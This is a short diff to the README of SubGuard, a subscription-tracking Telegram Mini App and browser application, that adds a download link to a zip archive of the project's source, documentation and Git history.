@@ -1,5 +1,7 @@
 # SubGuard
 
+[Download SUBGUARD_001.zip](https://github.com/Aydenxvi/subguard/raw/refs/heads/main/downloads/SUBGUARD_001.zip) — packaged source, documentation and portable Git history.
+
 **Your subscriptions. Your decision.** A Telegram Mini App and browser application for
 tracking recurring payments, free trials, cancellation requests and refund cases.
 Inspired by the founder’s experience of forgotten subscriptions and unexpected charges.
